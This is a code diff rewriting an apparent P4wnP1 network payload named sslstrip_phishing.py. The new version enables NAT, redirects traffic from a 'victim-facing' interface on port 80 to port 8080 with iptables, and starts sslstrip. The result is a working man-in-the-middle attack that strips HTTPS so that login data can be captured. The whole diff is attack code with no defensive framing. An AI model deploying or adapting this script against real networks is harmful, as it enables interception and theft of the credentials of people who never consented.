@@ -1,14 +1,17 @@
-# File: /opt/p4wnp1/payloads/network/sslstrip_phishing.py
-import subprocess
-import os
+#!/usr/bin/env python3
+import subprocess, os
 
-iface = os.environ.get("IFACE", "usb0")
+LANIF = os.getenv("LANIF","wlan0")   # victim-facing
+UPIF  = os.getenv("UPIF","usb0")     # upstream (if you have one)
 
-print(f"[*] Starting SSLStrip on interface: {iface}")
+def main():
+    # NAT toward upstream
+    subprocess.run(["iptables","-t","nat","-C","POSTROUTING","-o",UPIF,"-j","MASQUERADE"], check=False)
+    subprocess.run(["iptables","-t","nat","-A","POSTROUTING","-o",UPIF,"-j","MASQUERADE"], check=False)
+    # 80 -> 8080 redirect
+    subprocess.run(["iptables","-t","nat","-A","PREROUTING","-i",LANIF,"-p","tcp","--dport","80","-j","REDIRECT","--to-port","8080"], check=True)
+    subprocess.Popen(["sslstrip","-l","8080"])
+    print("[+] sslstrip listening on :8080; NAT enabled")
 
-try:
-    subprocess.run(["sslstrip", "-l", "8080"])
-except FileNotFoundError:
-    print("[!] sslstrip not found. Please install it first.")
-except KeyboardInterrupt:
-    print("[!] SSLStrip interrupted.")
+if __name__=="__main__":
+    main()
